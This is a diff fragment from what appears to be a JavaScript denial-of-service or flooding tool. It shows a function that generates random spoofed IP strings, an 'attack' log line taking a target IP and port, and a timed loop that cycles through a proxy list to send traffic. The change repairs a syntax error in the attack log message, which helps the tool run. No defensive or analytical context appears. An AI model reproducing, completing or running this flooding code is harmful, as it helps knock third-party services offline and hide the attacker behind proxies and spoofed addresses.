@@ -36,7 +36,7 @@ function spoof(){
     return `${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}`;
 }
     console.log(data);
-    console.log("Starting Attack IP : "+ target + "PORT : " + port + ")
+    console.log("Starting Attack IP : "+ target + "PORT : " + port + "")
 setInterval(function() {
     var proxy = proxies[Math.floor(Math.random() * proxies.length)];
     proxy = proxy.split(':');
